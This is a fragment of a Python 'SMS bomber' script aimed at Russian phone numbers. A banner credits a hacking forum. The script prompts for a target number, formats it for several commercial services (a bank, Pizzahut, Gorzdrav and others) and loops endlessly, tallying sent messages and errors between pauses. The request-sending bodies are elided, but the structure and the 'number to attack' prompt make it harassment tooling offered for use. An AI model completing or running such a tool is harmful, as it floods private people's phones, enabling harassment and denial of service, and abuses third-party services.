...
|                                                    |
| [</>] SMS BOMBER FOR RUSSIA                        |
|                                                    |
| [</>] Service: 50                                  |
|                                                    |
| [</>] Found on LolzTeam: DanuGrigorita             |
|                                                    |
| [</>] Modified: Shpex                              |
|____________________________________________________|
"""

def ConverNumber(_phone):
	if _phone[0] == '+':
		_phone = _phone[1:]
	if _phone[0] == '8':
		_phone = '7'+_phone[1:]
...
def CreateAcc(_phone):
	...
	return _phone9, _phoneAresBank, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username

def attack(error, well, _phone, _phone9, _phoneAresBank, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username):
	iteration = 0
	while True:
		...
		try:
			iteration += 1
			print("Пройдено кругов: " + str(iteration) + " | Ошибок: "+ str(error) + " | Отправлено: " + str(well))
			print("Пауза. 3 минуты.")
			time.sleep(60)
			print("Пауза. 2 минуты.")
			time.sleep(60)
			print("Пауза. 1 минуты.")
			time.sleep(60)
			os.system("cls")
		except:
			break
...
def main(_phone):
	_phone9, _phoneAresBank, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username = CreateAcc(_phone)
	attack(0, 0,_phone, _phone9, _phoneAresBank, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username)

if __name__ == "__main__":
	print(banner)
	_phone = ConverNumber(input('Номер для атаки (79xxxxxxxxx): '))
	while True:
		main(_phone)